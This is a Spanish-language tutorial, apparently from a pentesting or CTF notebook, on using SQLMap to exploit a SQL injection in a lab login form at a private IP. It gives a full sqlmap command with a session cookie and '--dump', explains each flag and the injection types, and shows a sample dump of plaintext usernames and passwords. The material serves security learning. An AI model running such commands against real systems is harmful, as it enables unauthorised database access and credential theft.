## SQLMap

**SQLMap** automatiza la detección y explotación de **inyecciones SQL**. Una vez confirmas a mano una SQLi (mira [SQL](../Web/Inyecciones/SQL.md)), SQLMap se encarga del resto: enumerar bases de datos, tablas y volcar los datos.

### Comando completo explicado línea a línea

```bash
sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --dump \
  --batch
```

| Parámetro          | Función                                                            |
| ------------------ | ------------------------------------------------------------------ |
| `-u`               | URL objetivo (la petición que inyectamos).                         |
| `--data`           | Datos del POST. El `*` marca **dónde probar la inyección**.        |
| `--cookie`         | Sesión autenticada (necesaria si la zona inyectable está tras login). |
| `-p`               | Parámetro concreto a testear (aquí `username`).                    |
| `--level 3 --risk 2` | Aumenta profundidad de pruebas. Mayores niveles = más lento pero más completo. |
| `--dbms`           | Fuerza el motor de BD (aquí MySQL), acelera y evita falsos positivos. |
| `--dump`           | Vuelca todas las **tablas** de la BD actual.                       |
| `--batch`          | Acepta las opciones por defecto, **sin interrumpir** la ejecución. |

### Tipos de inyección que SQLMap detecta

En este ejemplo, SQLMap detecta en `username` tres tipos:

- **boolean-based blind**: la respuesta cambia dependiendo de si la condición SQL es verdadera o falsa.
- **time-based blind**: no hay salida visible; se deduce por los **retrasos** (`SLEEP`).
- **UNION query**: permite **extraer datos directamente en la respuesta HTTP** (normalmente es el que aprovechamos).

Gracias a la UNION query, `--dump` vuelca todas las tablas de la base de datos actual.

### Ejemplo de salida

```
Database: register
Table: users
+----+-----------+----------+
| id | passwd    | username |
+----+-----------+----------+
| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |
+----+-----------+----------+
```

> **Consejo:** ejecuta primero `--batch` para reconocer la BD, y luego afina con `--dump -D <bd> -T <tabla>` para volcar solo lo que te interesa.